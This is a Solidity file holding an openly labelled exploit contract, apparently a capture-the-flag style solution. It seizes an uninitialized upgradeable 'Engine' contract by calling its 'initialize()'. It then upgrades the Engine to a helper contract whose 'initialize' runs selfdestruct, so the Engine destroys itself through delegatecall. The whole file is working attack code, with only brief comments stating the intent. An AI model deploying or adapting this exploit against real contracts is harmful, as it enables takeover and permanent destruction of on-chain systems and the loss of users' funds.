// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract EngineAttack {
    function destroyEngine(address _engineAddr) external {
        // sets caller as the upgrader
        (bool initSuccess, ) = _engineAddr.call(
            abi.encodeWithSignature("initialize()")
        );
        require(initSuccess, "Init failed");

        // deploy contract to call to selfdestruct
        Explode explosion = new Explode();

        // Engine contract selfdestructs due to delegatecall on malicious contract
        (bool upgradeSuccess, ) = _engineAddr.call(
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                address(explosion),
                abi.encodeWithSignature("initialize()")
            )
        );
        require(upgradeSuccess, "Upgrade failed");
    }
}

contract Explode {
    function initialize() external {
        selfdestruct(payable(msg.sender));
    }
}
